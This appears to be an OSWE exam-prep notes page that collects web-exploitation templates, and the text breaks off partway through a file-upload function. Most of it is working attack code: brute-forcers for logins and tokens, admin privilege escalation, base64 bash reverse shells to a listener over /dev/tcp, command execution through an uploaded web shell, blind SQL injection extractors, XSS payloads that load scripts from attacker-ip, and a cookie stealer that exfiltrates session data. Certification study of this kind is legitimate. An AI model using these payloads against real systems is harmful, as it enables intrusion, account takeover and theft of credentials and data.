---
layout: python-code-snippets
title: Python Code Snippets
permalink: /python-code-snippets/
---

<!-- OSWE Reference (HTML) - paste into your .md file -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>

<style>
  /* klisé-inspired variables (dark theme). Tweak these to match the theme precisely */
  :root{
    --bg: #0a0a0a;
    --panel: #151515;
    --muted: #a1a1a1;
    --text: #d4d4d4;
    --accent: #ff7f50;
    --accent-2: #ffffff;
    --code-bg: #050505;
    --border: rgba(255,255,255,0.2);
  }

  /* Container and typography */
  .oswe-container{
    background: var(--bg);
    color: var(--text);
    font-family: Inter, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    padding: 28px;
    line-height: 1.6;
    border-radius: 8px;
    box-shadow: 0 6px 24px rgba(2,6,23,0.6);
  }

  .oswe-title{
    color: var(--accent);
    margin: 0 0 8px 0;
    font-size: 1.9rem;
    letter-spacing: -0.5px;
  }

  .oswe-subtitle{
    color: var(--muted);
    margin: 0 0 18px 0;
    font-size: 0.95rem;
  }

  /* TOC */
  .oswe-toc{
    background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.0));
    border: 1px solid var(--border);
    padding: 14px;
    border-radius: 8px;
    margin-bottom: 18px;
  }
  .oswe-toc a{ color: var(--accent); text-decoration: none; }
  .oswe-toc a:hover{ text-decoration: underline; }

  /* Headings */
  h1, h2, h3, h4 {
    color: var(--accent-2);
    margin-top: 20px;
  }
  h1 { font-size: 1.6rem; }
  h2 { font-size: 1.25rem; }
  h3 { font-size: 1.05rem; color: var(--accent); }

  /* Paragraphs & lists */
  p, li, pre, code { color: var(--text); }
  code.inline { background: rgba(255,255,255,0.03); padding: 2px 6px; border-radius: 4px; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Courier New", monospace; font-size: .95em; }
  ul { margin-left: 1.1rem; }
  ul > li { list-style-type: none; }
  ul > li::before { content: ""; }

  /* Panels */
  .panel {
    background: var(--panel);
    border: 1px solid var(--border);
    padding: 12px;
    border-radius: 8px;
    margin: 10px 0;
  }

  /* Code blocks (Prism theme file included above) */
  pre[class*="language-"] {
    background: var(--code-bg) !important;
    border-radius: 8px;
    padding: 14px;
    overflow: auto;
    margin: 14px 0;
    border: 1px solid var(--border);
    box-shadow: inset 0 -10px 50px rgba(0,0,0,0.6);
    font-size: 0.95rem;
    white-space: pre-wrap;
    word-wrap: break-word;
    word-break: break-all;
  }
  /* Make code fonts a little larger for readability */
  pre code { font-family: "Fira Code", "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, monospace; }

  /* small helper styles */
  .muted { color: var(--muted); font-size: .95rem; }
  .kbd { background:#0c1723; border:1px solid var(--border); padding:3px 6px; border-radius:6px; font-family: ui-monospace; color:var(--accent); }
  a { color: var(--accent); }

  /* Layout styles */
  .oswe-main {
    display: flex;
    gap: 20px;
  }
  .oswe-toc {
    flex: 0 0 250px;
    position: sticky;
    top: 20px;
    height: fit-content;
  }
  .oswe-content {
    flex: 1;
  }
  .content-section {
    display: none;
  }
</style>

<div class="oswe-container">
  <h1 class="oswe-title">OSWE</h1>
  <p class="oswe-subtitle">Notes & snippets</p>

  <div class="oswe-main">
    <div class="oswe-toc panel">
      <strong>Contents</strong>
      <ol>
        <li><a href="#Authentication-Bypass">Authentication Bypass</a></li>
        <li><a href="#Remote-Code-Execution">Remote Code Execution</a></li>
        <li><a href="#SQL-Injection">SQL Injection</a></li>
        <li><a href="#XSS">XSS</a>
          <ul>
            <li><a href="#XSS-Payload-1">Payload 1 (Load External JS)</a></li>
            <li><a href="#XSS-Payload-2">Payload 2 (Load Inline JS)</a></li>
            <li><a href="#XSS-Cookies-Stealer">XSS Cookies Stealer</a></li>
            <li><a href="#Leverage-XSS-to-CSRF">Leverage XSS to CSRF</a></li>
          </ul>
        </li>
        <li><a href="#CSRF">CSRF</a></li>
        <li><a href="#File-Upload">File Upload</a></li>
        <li><a href="#Insecure-Deserialization">Insecure Deserialization</a>
          <ul>
            <li><a href="#Java-Insecure-Deserialization">Java Insecure Deserialization</a></li>
          </ul>
        </li>
        <li><a href="#SSTI">SSTI</a></li>
        <li><a href="#Prototype-Pollution">Prototype Pollution</a></li>
        <li><a href="#SSRF">SSRF</a></li>
        <li><a href="#Type-Juggling">Type Juggling</a></li>
        <li><a href="#Application-Logic-Flaws">Application Logic Flaws</a></li>
        <li><a href="#CORS">CORS</a></li>
        <li><a href="#Database-Debug-Logging">Database Debug & Logging</a>
          <ul>
            <li><a href="#Postgres">Postgres</a></li>
            <li><a href="#MySQL">MySQL</a></li>
          </ul>
        </li>
        <li><a href="#Python-Templates">Python Templates</a>
          <ul>
            <li><a href="#Starting-Template">Starting Template</a></li>
            <li><a href="#File-Upload-Template">File Upload Template</a></li>
            <li><a href="#HTTP-File-Server-Template">HTTP File Server Template</a></li>
          </ul>
        </li>
        <li><a href="#Bypass-Filters">Bypass Filters</a>
          <ul>
            <li><a href="#Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</a></li>
            <li><a href="#Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</a></li>
          </ul>
        </li>
        <li><a href="#YSOSerial">YSOSerial</a></li>
        <li><a href="#Regex-Cheatsheet">Regex Cheatsheet</a></li>
        <li><a href="#Report-Recommendations">Report Recommendations</a></li>
        <li><a href="#Additional-Resources">Additional Resources</a></li>
      </ol>
    </div>

    <div class="oswe-content">
      <!-- CONTENT -->
      <div class="content-section" id="section-Authentication-Bypass">
        <h2 id="Authentication-Bypass">Authentication Bypass</h2>
        <div class="panel">
          <p class="muted">Common techniques:</p>
          <ul>
            <li>SQLi, XSS, Type Juggling, Application Logic Flaws, CORS, CSRF etc.</li>
          </ul>
        </div>
        <h3>Template: Get CSRF Token</h3>
        <pre><code class="language-python">import re
import requests

def get_csrf_token(url, path, proxies=None):
    response = requests.get(url + path, verify=False, proxies=proxies)
    body = response.text
    pattern = r'&lt;input\b[^&gt;]*\bvalue\s*=\s*\"([^"]*)\"[^&gt;]*&gt;'
    matches = re.findall(pattern, body, re.DOTALL)
    if matches:
        csrf_token = matches[0].strip()
        print(f"[+] Retrieved CSRF token: {csrf_token}")
        return csrf_token
    else:
        print("[-] No CSRF token found.")
        return None</code></pre>
        <h3>Template: Login Brute Force (e.g., Verification Code)</h3>
        <pre><code class="language-python">import re
import requests

def login_brute(url, username, password, csrf_token, code_file, proxies=None):
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    print("[+] Bruting verification codes...")
    with open(code_file, "r") as f:
        for code in f:
            code = code.rstrip()
            data = {
                '_csrf': csrf_token,
                'username': username,
                'password': password,
                'verification_code': code,
                'submit': 'Submit',
            }
            r = requests.post(url, headers=headers, data=data, proxies=proxies, allow_redirects=False)
            if r.status_code == 302:
                print(f"[+] Valid code: {code}")
                # Extract session cookie
                set_cookie = r.headers.get('Set-Cookie', '')
                pattern = r'PHPSESSID=([^;]+)'
                match = re.search(pattern, set_cookie)
                if match:
                    session_id = match.group(1).strip()
                    print(f"[+] Session ID: {session_id}")
                    return session_id
    print("[-] No valid code found.")
    return None</code></pre>
        <h3>Template: Elevate to Admin via Profile Update</h3>
        <pre><code class="language-python">import requests
import json

def elevate_to_admin(url, auth_token, username, proxies=None):
    headers = {
        'Content-Type': 'application/json',
        'x-auth-token': auth_token
    }
    data = {
        "email": f"{username}@example.com",
        "username": username,
        "isAdmin": "true"
    }
    r = requests.put(url, headers=headers, json=data, proxies=proxies)
    if r.status_code == 200:
        print(f"[+] User {username} elevated to admin.")
        try:
            json_data = json.loads(r.text)
            new_token = json_data.get("token")
            if new_token:
                print(f"[+] New admin token: {new_token}")
                return new_token
        except json.JSONDecodeError:
            print("[-] Response not valid JSON.")
    print("[-] Elevation failed.")
    return None</code></pre>
        <h3>Template: Generate Magic Token and Brute</h3>
        <pre><code class="language-python">import requests
import re
from email.utils import parsedate_to_datetime

def generate_magic_token(url, username, proxies=None):
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'username': username}
    # Send multiple requests to get timestamp range
    r_first = requests.post(url, headers=headers, data=data, allow_redirects=False, proxies=proxies)
    first_time = int(parsedate_to_datetime(r_first.headers.get('Date')).timestamp() * 1000)
    # Simulate multiple requests...
    r_last = requests.post(url, headers=headers, data=data, allow_redirects=False, proxies=proxies)
    last_time = int(parsedate_to_datetime(r_last.headers.get('Date')).timestamp() * 1000)
    print(f"[+] Timestamp range: {first_time} - {last_time}")
    return first_time, last_time</code></pre>
        <h3>Template: Token Brute Force</h3>
        <pre><code class="language-python">import re
import requests

def token_brute(url, token_file, proxies=None):
    print("[+] Bruting tokens...")
    with open(token_file, "r") as f:
        for token in f:
            token = token.rstrip()
            r = requests.get(f"{url}/{token}", proxies=proxies, allow_redirects=False)
            if "Set-Cookie" in r.headers:
                set_cookie = r.headers.get('Set-Cookie', '')
                pattern = r'JSESSIONID=([^;]+)'
                match = re.search(pattern, set_cookie)
                if match:
                    session_id = match.group(1).strip()
                    print(f"[+] Valid session ID: {session_id}")
                    return session_id
    print("[-] No valid token found.")
    return None</code></pre>
      </div>

      <div class="content-section" id="section-Remote-Code-Execution">
        <h2 id="Remote-Code-Execution">Remote Code Execution</h2>
        <div class="panel">
          <p class="muted">Common techniques:</p>
          <ul>
            <li>SQLi, Javascript Injection, File upload, Deserialization, SSTI, Prototype Pollution, SSRF.</li>
          </ul>
        </div>
        <h3>Template: Generate Base64 Reverse Shell</h3>
        <pre><code class="language-python">import base64

def generate_b64revshell(listener_ip, listener_port, shell_type='bash'):
    payload = f"{shell_type} -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
    encoded = base64.b64encode(payload.encode()).decode()
    print(f"[+] Generated payload: {encoded}")
    return encoded</code></pre>
        <h3>Template: Upload Malicious File</h3>
        <pre><code class="language-python">import requests
import random
import string

def upload_file(url, cookies, payload, headers=None, data=None, filename_ext='.php', proxies=None):
    filename = ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + filename_ext
    if headers is None:
        headers = {'Content-Type': 'multipart/form-data; boundary=----boundary'}
    multipart_data = f'------boundary\r\nContent-Disposition: form-data; name="file"; filename="{filename}"\r\nContent-Type: image/jpeg\r\n\r\n{payload}\r\n------boundary--\r\n'
    r = requests.post(url, headers=headers, cookies=cookies, data=multipart_data, proxies=proxies)
    if r.status_code == 200:
        print(f"[+] File {filename} uploaded successfully.")
        return filename
    else:
        print("[-] Upload failed.")
        return None</code></pre>
        <h3>Template: Trigger Reverse Shell via Uploaded File</h3>
        <pre><code class="language-python">import requests

def trigger_rev_shell(url, filename, encoded_payload, proxies=None):
    trigger_url = f"{url}/{filename}?cmd=echo '{encoded_payload}' | base64 -d | bash"
    r = requests.get(trigger_url, proxies=proxies)
    print("[+] Triggering reverse shell...")</code></pre>
        <h3>Template: Upload Plugin (Zip)</h3>
        <pre><code class="language-python">import requests

def upload_plugin(url, auth_token, zip_filename, proxies=None):
    headers = {'x-auth-token': auth_token}
    with open(zip_filename, 'rb') as f:
        files = {'zipFile': (zip_filename, f)}
        r = requests.post(url, files=files, headers=headers, proxies=proxies)
    if r.status_code == 200:
        print("[+] Plugin uploaded successfully.")
    else:
        print("[-] Upload failed.")</code></pre>
        <h3>Template: Update Preferences for Deserialization RCE</h3>
        <pre><code class="language-python">import requests
import json

def update_preferences(url, auth_token, payload, user_id, proxies=None):
    headers = {
        'authorization': f'Bearer {auth_token}',
        'Content-Type': 'application/json',
    }
    data = {
        "email_notifications": "1",
        "notification_frequency": payload  # Insecure deserialization payload
    }
    r = requests.post(f"{url}?user_id={user_id}", headers=headers, json=data, proxies=proxies)
    if r.status_code == 200:
        print("[+] Preferences updated for RCE.")</code></pre>
        <h3>Template: Trigger Deserialization</h3>
        <pre><code class="language-python">import requests

def trigger_deserialization(url, auth_token, user_id, proxies=None):
    headers = {'authorization': f'Bearer {auth_token}'}
    r = requests.get(f"{url}?user_id={user_id}", headers=headers, proxies=proxies)
    print("[+] Deserialization triggered.")</code></pre>
      </div>

      <div class="content-section" id="section-SQL-Injection">
        <h2 id="SQL-Injection">SQL Injection</h2>
        <p>Refer to Database Debug & Logging for enabling logs to identify SQLi points.</p>
        <h3>Template: Blind SQL Injection (Threaded)</h3>
        <pre><code class="language-python">import requests
import string
from concurrent.futures import ThreadPoolExecutor

def blind_sqli(url_template, cookies, success_condition, charset=string.printable, position_start=1, proxies=None):
    extracted = ''
    position = position_start
    while True:
        found = None
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for char in charset:
                ascii_val = ord(char)
                payload = f"1 AND (ascii(substr((select secret from table WHERE condition),{position},1)))={ascii_val}--"  # Adjust query
                url = url_template.format(payload=payload)
                future = executor.submit(requests.get, url, cookies=cookies, proxies=proxies, allow_redirects=False)
                futures.append((future, char))
            for future, char in futures:
                r = future.result()
                if success_condition in r.text:
                    found = char
                    break
        if found:
            extracted += found
            print(f"\r[+] Extracted: {extracted}", end='', flush=True)
            position += 1
        else:
            print("\n[-] Extraction complete.")
            break
    return extracted</code></pre>
        <h3>Template: Blind SQLi via WebSocket</h3>
        <pre><code class="language-python">import asyncio
import websockets
import string

async def blind_sqli_ws(ws_url, auth_token, payload_template, success_condition, charset=string.printable, position_start=1):
    extracted = ''
    position = position_start
    uri = f"ws://{ws_url}/socket.io/?EIO=3&transport=websocket"
    async with websockets.connect(uri) as ws:
        while True:
            found = None
            for char in charset:
                ascii_val = ord(char)
                payload = payload_template.format(position=position, ascii_val=ascii_val)
                await ws.send(payload)
                response = await asyncio.wait_for(ws.recv(), timeout=10.0)
                if success_condition in response:
                    found = char
                    break
            if found:
                extracted += found
                print(f"[+] Extracted: {extracted}", end='\r')
                position += 1
            else:
                break
    return extracted</code></pre>
      </div>

      <span id="XSS"></span>
      <div class="content-section group-xss" id="section-XSS-title">
        <h2>XSS</h2>
      </div>
      <div class="content-section group-xss" id="section-XSS-Payload-1">
        <h3 id="XSS-Payload-1">Payload 1 (Load External JS)</h3>
        <div class="panel">
          <ul>
            <li><code>&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://attacker-ip/malicious.js'; document.body.appendChild(script);" /&gt;</code></li>
            <li><code>&lt;img src=x onerror=eval(atob("&lt;BASE64 JAVASCRIPT PAYLOAD&gt;"))&gt;</code></li>
            <li><code>&lt;audio onloadstart="var s=document.createElement('script');s.src='//attacker-ip/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
            <li><code>&lt;iframe/srcdoc="&lt;script/src=//attacker-ip/worked.js&gt;&lt;/script&gt;"&gt;</code></li>
            <li><code>&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://attacker-ip/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></li>
          </ul>
        </div>
      </div>
      <div class="content-section group-xss" id="section-XSS-Payload-2">
        <h3 id="XSS-Payload-2">Payload 2 (Load Inline JS)</h3>
        <div class="panel">
          <ul>
            <li><code>&lt;audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
            <li><code>&lt;audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()&gt;&lt;/audio&gt;</code></li>
            <li><code>&lt;audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
            <li><code>&lt;video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))&gt;&lt;/video&gt;</code></li>
          </ul>
        </div>
      </div>
      <div class="content-section group-xss" id="section-XSS-Cookies-Stealer">
        <h3 id="XSS-Cookies-Stealer">XSS Cookies Stealer</h3>
        <div class="panel">
          <pre><code class="language-python">import requests
import socket
import base64
import re

def send_xss_payload(target_url, payload_data, xss_payload):
    data = payload_data.copy()
    data['text'] = xss_payload  # Adjust key based on form
    try:
        r = requests.post(target_url, data=data, proxies=proxies)
        if r.status_code == 200:
            print("XSS payload sent successfully.")
        else:
            print(f"Server responded with status code: {r.status_code}")
    except Exception as e:
        print(f"Error sending payload: {e}")

def listen_for_cookies(host, port, cookie_name='PHPSESSID'):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)
        print(f"Listening on {host}:{port} ...")
        print("Waiting for trigger...")

        conn, addr = s.accept()
        with conn:
            print(f"Connection from {addr}")
            data = conn.recv(2048)

            # Base64 encode for logging
            encoded_data = base64.b64encode(data).decode('utf-8')
            print(f"Base64 Encoded Request: " + encoded_data)

            decoded_data = data.decode('utf-8', errors='ignore')

            # Extract cookie - adjust regex as needed
            match = re.search(rf'{cookie_name}=([^;& ]+)', decoded_data)
            if match:
                cookie = match.group(1)
                print(f"{cookie_name} captured: " + cookie)
                return cookie
            else:
                print(f"{cookie_name} not found in received data.")

# Example usage
# target_url = 'http://example.com/post'
# payload_data = {'title': 'test', 'author': 'blabla', 'submit': 'Submit'}
# xss_payload = "&lt;script&gt;document.location='http://listener-ip:port/?c='+document.cookie&lt;/script&gt;"
# send_xss_payload(target_url, payload_data, xss_payload)
# listen_for_cookies('0.0.0.0', 9001)</code></pre>
        </div>
      </div>
      <div class="content-section group-xss" id="section-Leverage-XSS-to-CSRF">
        <h3 id="Leverage-XSS-to-CSRF">Leverage XSS to CSRF</h3>
        <div class="panel">
          <pre><code class="language-javascript">var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/account-endpoint',true);  // Adjust endpoint
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];  // Adjust regex
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/change-endpoint', true);  // Adjust endpoint
    changeReq.send('csrf='+token+'&param=value')  // Adjust params
};</code></pre>
        </div>
        <h3>Template: Send XSS Payload</h3>
        <pre><code class="language-python">import requests

def send_xss_payload(url, data_template, xss_payload, proxies=None):
    data = data_template.copy()
    data['description'] = xss_payload  # Adjust field
    r = requests.post(url, data=data, proxies=proxies)
    if r.status_code == 200:
        print("[+] XSS payload sent.")
    else:
        print("[-] Failed to send XSS.")</code></pre>
        <h3>Template: Create JS Payload for XSS Exfil</h3>
        <pre><code class="language-python">def create_js_payload(exfil_url, exfil_endpoint, token_var='token'):
    payload = f"""
function getCookieValue(name) {{
    const cookieString = document.cookie;
    const cookies = cookieString.split('; ');
    for (let cookie of cookies) {{
        const [key, value] = cookie.split('=');
        if (key === name) return value;
    }}
    return null;
}}

const cookieName = '{token_var}';
const cookieValue = getCookieValue(cookieName);

var req = new XMLHttpRequest();
req.open('GET', '{exfil_url}/{exfil_endpoint}', false);
req.setRequestHeader('authorization', 'Bearer ' + cookieValue);
req.send();
var response = req.responseText;

var req2 = new XMLHttpRequest();
req2.open('GET', '{exfil_url}/' + btoa(response), true);
req2.send();
    """
    with open('./payload.js', 'w') as f:
        f.write(payload)
    print("[+] JS payload created.")</code></pre>
        <h3>Template: Send XSS via WebSocket with Exfil</h3>
        <pre><code class="language-python">import asyncio
import websockets
import socket
import base64
import json

async def send_ws_xss(ws_url, auth_token, group_id, xss_payload, exfil_host, listener_port, proxies=None):
    uri = f"ws://{ws_url}/send-message?token={auth_token}&group_id={group_id}"
    async with websockets.connect(uri) as ws:
        await ws.send(xss_payload)
        print("[+] XSS sent via WS.")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', listener_port))
        s.listen(5)
        print(f"[+] Listening for exfil on {listener_port}...")
        while True:
            conn, addr = s.accept()
            data = conn.recv(4096)
            decoded = data.decode('utf-8', errors='ignore')
            path = decoded.split()[1]
            if path != '/payload.js':
                try:
                    exfil_data = json.loads(base64.b64decode(path.lstrip('/')).decode())
                    # Extract relevant data
                    print(f"[+] Exfiltrated data: {exfil_data}")
                    return exfil_data.get('address'), exfil_data.get('group_id')
                except Exception as e:
                    print(f"[-] Exfil error: {e}")
            # Serve payload.js if requested
            with open('payload.js', 'rb') as f:
                js = f.read()
            resp = f"HTTP/1.1 200 OK\r\nContent-Type: application/javascript\r\nContent-Length: {len(js)}\r\n\r\n".encode() + js
            conn.sendall(resp)</code></pre>
      </div>

      <div class="content-section" id="section-CSRF">
        <h2 id="CSRF">CSRF</h2>
        <p>See Leverage XSS to CSRF in XSS section for exploitation example.</p>
        <h3>Template: Start Web Server for CSRF via XSS</h3>
        <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
import threading

def start_web_server(csrf_payload, listener_ip='0.0.0.0', port=8000):
    class MyHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path.endswith('/payload.js'):
                self.send_response(200)
                self.send_header("Content-Type", "application/javascript")
                self.send_header("Content-Length", str(len(csrf_payload)))
                self.end_headers()
                self.wfile.write(csrf_payload.encode())

    httpd = HTTPServer((listener_ip, port), MyHandler)
    request_received = threading.Event()
    def serve():
        httpd.serve_forever()
    threading.Thread(target=serve).start()
    print(f"[+] Serving CSRF payload on port {port}.")
    request_received.wait()  # Wait for trigger
    httpd.shutdown()</code></pre>
      </div>

      <div class="content-section" id="section-File-Upload">
        <h2 id="File-Upload">File Upload</h2>
        <div class="panel">
          <pre><code class="language-python">import requests
import random
import string
import io

def upload_file(url, cookies, payload_content, data, filename_extension='.phar', mime_type='application/octet-stream'):
    pwny = io.BytesIO(payload_content)

    filename = ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + filename_extension
    files = {
        "image": (filename, pwny, mime_type)
    }

    r = requests.post(url, data=data, files=files, cookies=cookies, proxies=proxies, allow_redirects=False)
    # Adjust success check based on application response
    if 'success' in r.text.lower():  # Example check
        print(f"[+] Filename {filename} uploaded successfully!")
        return filename
    else:
        print("[-] File is not uploaded.")
        return None</code></pre>
        </div>
      </div>

      <span id="Insecure-Deserialization"></span>
      <div class="content-section group-deser" id="section-Insecure-Deserialization-title">
        <h2>Insecure Deserialization</h2>
      </div>
      <div class="content-section group-deser" id="section-Java-Insecure-Deserialization">
        <h3 id="Java-Insecure-Deserialization">Java Insecure Deserialization</h3>
        <h4>Methods and Classes</h4>
        <div class="panel">
          <ul>
            <li><code>ObjectInputStream.readObject()</code> Primary method for deserializing objects in Java.</li>
            <li><code>ObjectInputStream.readUnshared()</code></li>
            <li><code>ObjectInputStream.readResolve()</code></li>
            <li><code>ObjectInputStream.defaultReadObject()</code></li>
            <li><code>XMLDecoder.readObject()</code></li>
            <li><code>XStream.fromXML()</code></li>
            <li><code>ObjectMapper.readValue()</code> (Jackson)</li>
            <li><code>Kryo.readObject()</code> (Kryo)</li>
            <li><code>SnakeYAML.load()</code></li>
          </ul>
        </div>

        <h4>Identify Insecure Deserialization in Source Code</h4>
        <p>When auditing source code, follow these steps to identify potential insecure deserialization vulnerabilities:</p>

        <h5>Search for Deserialization Methods</h5>
        <p>Use code analysis tools (grep, IDE search, SonarQube) to find calls to the methods listed above.</p>
        <div class="panel">
          <pre><code class="language-bash">grep -r "readObject" .
grep -r "XStream\.fromXML" .
grep -r --include="*.java" -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' .</code></pre>
        </div>

        <h5>Trace Input Sources</h5>
        <p>Trace inputs to see if untrusted (network, file upload, request params) data flows into deserialization APIs.</p>

        <h5>Check for Validation or Whitelisting</h5>
        <p>Look for <code>ObjectInputFilter</code> or similar filters. Example:</p>
        <div class="panel">
          <pre><code class="language-java">ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filter);</code></pre>
        </div>

        <h5>Inspect Serializable Classes</h5>
        <p>Find classes implementing <code>Serializable</code> or <code>Externalizable</code> and inspect special read/write hooks.</p>
      </div>

      <div class="content-section" id="section-SSTI">
        <h2 id="SSTI">SSTI</h2>
        <p>Refer to concepts for exploitation techniques.</p>
      </div>

      <div class="content-section" id="section-Prototype-Pollution">
        <h2 id="Prototype-Pollution">Prototype Pollution</h2>
        <p>Refer to concepts for exploitation techniques.</p>
      </div>

      <div class="content-section" id="section-SSRF">
        <h2 id="SSRF">SSRF</h2>
        <p>Refer to concepts for exploitation techniques.</p>
      </div>

      <div class="content-section" id="section-Type-Juggling">
        <h2 id="Type-Juggling">Type Juggling</h2>
        <p>Refer to authentication bypass concepts.</p>
      </div>

      <div class="content-section" id="section-Application-Logic-Flaws">
        <h2 id="Application-Logic-Flaws">Application Logic Flaws</h2>
        <p>Refer to authentication bypass concepts.</p>
        <h3>Template: Join Group (e.g., Admin/Secret)</h3>
        <pre><code class="language-python">import requests

def join_group(url, auth_token, group_address, proxies=None):
    headers = {'authorization': f'Bearer {auth_token}'}
    r = requests.post(f"{url}?address={group_address}", headers=headers, proxies=proxies)
    if r.status_code == 200:
        print(f"[+] Joined group {group_address}.")
    else:
        print("[-] Failed to join group.")</code></pre>
      </div>

      <div class="content-section" id="section-CORS">
        <h2 id="CORS">CORS</h2>
        <p>Refer to authentication bypass concepts.</p>
      </div>

      <span id="Database-Debug-Logging"></span>
      <div class="content-section group-db" id="section-Database-Debug-Logging-title">
        <h2>Database Debug & Logging</h2>
      </div>
      <div class="content-section group-db" id="section-Postgres">
        <h3 id="Postgres">Postgres</h3>
        <p>Edit your <code class="inline">/etc/postgresql/&lt;version-num&gt;/main/postgresql.conf</code>, and change the lines as follows.</p>
        <p class="muted">Note: If you didn't find the postgresql.conf file, then just type <code class="kbd">$locate postgresql.conf</code> in a terminal</p>

        <p>Uncomment these fields:</p>
        <div class="panel">
          <ol>
            <li><code class="inline">#log_directory = 'log'</code></li>
            <li><code class="inline">#log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'</code></li>
          </ol>
        </div>

        <p>Change these fields values:</p>
        <div class="panel">
          <ol>
            <li><code class="inline">#log_statement = 'none'</code> → <code class="inline">log_statement = 'all'</code></li>
            <li><code class="inline">#logging_collector = off</code> → <code class="inline">logging_collector = on</code></li>
            <li>Restart: <code class="kbd">sudo /etc/init.d/postgresql restart</code> or <code class="kbd">sudo service postgresql restart</code></li>
            <li>Fire query in postgresql: <code class="inline">select 2+2</code>.</li>
            <li>Find current log in <code class="inline">/var/lib/postgresql/10/main/log</code></li>
          </ol>
        </div>
      </div>
      <div class="content-section group-db" id="section-MySQL">
        <h3 id="MySQL">MySQL</h3>
        <p>Login to the MySQL instance and check out the <code class="inline">general_log</code> and values, whether it is set to ON or OFF:</p>
        <div class="panel">
          <pre><code class="language-sql">show variables like '%log%';</code></pre>
        </div>

        <p>If it's OFF, run as root:</p>
        <div class="panel">
          <pre><code class="language-sql">SET GLOBAL general_log = 1;</code></pre>
        </div>

        <p>Then check <code class="inline">general_log_file</code> to find where logs are written.</p>
      </div>

      <span id="Python-Templates"></span>
      <div class="content-section group-python" id="section-Python-Templates-title">
        <h2>Python Templates</h2>
      </div>
      <div class="content-section group-python" id="section-Starting-Template">
        <h3 id="Starting-Template">Starting Template</h3>
        <div class="panel">
          <pre><code class="language-python">import requests
import string
import re
import threading
import base64
import netifaces
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import BaseHTTPRequestHandler
from http.server import HTTPServer
import argparse

GREEN = '\033[92m'   # Bright Green
RED = '\033[91m'     # Bright Red
RESET = '\033[0m'    # Reset to default color

# Define reusable symbols

success = f"{GREEN}[+]{RESET}"
failure = f"{RED}[-]{RESET}"

proxies = {"http":"http://127.0.0.1:8080"}  # Optional, comment out if not needed

def generate_b64revshell(listener_ip, listener_port):
    payload = f"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
    payload_bytes = payload.encode('ascii')
    b64payload = base64.b64encode(payload_bytes)
    base64_payload = b64payload.decode('ascii')
    return base64_payload

def register(target_url, register_data):
    # Register logic - adjust based on application
    r = requests.post(target_url + '/register', data=register_data, proxies=proxies)
    # Parse response for username/password or success
    return 'username', 'password'  # Return registered credentials

def login(target_url, username, password):
    # Login logic - adjust based on application
    login_data = {'username': username, 'password': password}
    r = requests.post(target_url + '/login', data=login_data, proxies=proxies)
    # Extract cookies or session from response
    return r.cookies

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="General exploit template")
    parser.add_argument('--target-url', type=str, required=True, help="Specify the target base URL.")
    parser.add_argument('--listener-ip', type=str, required=True, help="Specify the listener IP Address.")
    parser.add_argument('--listener-port', type=str, required=True, help="Specify the listener port.")   
    args = parser.parse_args()

    target_url = args.target_url
    listener_ip = args.listener_ip
    listener_port = args.listener_port

    # Example register data - adjust as needed
    register_data = {'username': 'example', 'password': 'example'}
    username, password = register(target_url, register_data)
    usercookies = login(target_url, username, password) </code></pre>
        </div>
      </div>
      <div class="content-section group-python" id="section-File-Upload-Template">
        <h3 id="File-Upload-Template">File Upload Template</h3>
        <div class="panel">
          <pre><code class="language-python">import requests
import random
import string
import io

def upload_file(url, cookies, payload_content, data, filename_extension='.phar', mime_type='application/octet-stream'):
    pwny = io.BytesIO(payload_content)

    filename = ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + filename_extension
    files = {
